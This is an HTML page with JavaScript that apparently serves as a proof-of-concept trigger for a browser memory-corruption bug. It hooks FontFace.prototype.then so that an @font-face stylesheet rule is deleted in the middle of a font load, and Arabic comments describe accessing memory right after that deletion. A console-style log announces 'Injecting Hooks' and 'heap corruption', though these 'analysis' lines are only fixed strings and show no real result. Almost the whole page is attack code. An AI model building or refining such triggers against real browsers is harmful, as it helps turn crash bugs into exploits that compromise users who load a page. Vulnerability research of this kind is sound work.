<!DOCTYPE html>
<html>
<head>
    <style>
        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
        #console { width: 100%; height: 85vh; border: 1px solid #333; overflow-y: scroll; padding: 10px; background: #0a0a0a; }
        .entry { border-bottom: 1px solid #111; padding: 2px 0; }
    </style>
</head>
<body>
    <div id="console"></div>

    <style id="s">@font-face { font-family: 'x'; src: url('null'); }</style>

    <script>
        const logBox = document.getElementById('console');
        function debug(msg) {
            const time = new Date().getTime() % 10000;
            logBox.innerHTML += `<div class="entry">[${time}ms] ${msg}</div>`;
            logBox.scrollTop = logBox.scrollHeight;
        }

        window.onerror = (msg, url, line) => debug(`[CRITICAL] ${msg} at line ${line}`);

        debug("System Started. Injecting Hooks...");

        (async () => {
            debug("Heap Mapping: Initializing...");
            let A = new FontFace('x', 'local(Arial)', { unicodeRange: 'U+0041' });
            document.fonts.add(A);

            Object.defineProperty(FontFace.prototype, 'then', {
                get() {
                    debug("TRAP: then() accessed. Corruption Sequence Starting...");
                    // محاولة الوصول للذاكرة مباشرة بعد الحذف
                    document.getElementById('s').sheet.deleteRule(0);
                    
                    // استخراج حالة الذاكرة (Memory SnapShot)
                    if(window.performance && performance.memory) {
                        debug(`DEBUG: UsedHeap: ${performance.memory.usedJSHeapSize / 1024 / 1024}MB`);
                    }
                    
                    return undefined;
                }
            });

            debug("Executing Font load trigger...");
            try {
                // إزالة الشبكة تماماً باستخدام 'local'
                await document.fonts.load('1em x', 'AB');
                debug("Result: Load Finished.");
            } catch (e) {
                debug(`Result: Exception Caught: ${e.name} - ${e.message}`);
                debug("ANALYSIS: Memory state locked. Analyzing heap corruption...");
            }
        })();
    </script>
</body>
</html>
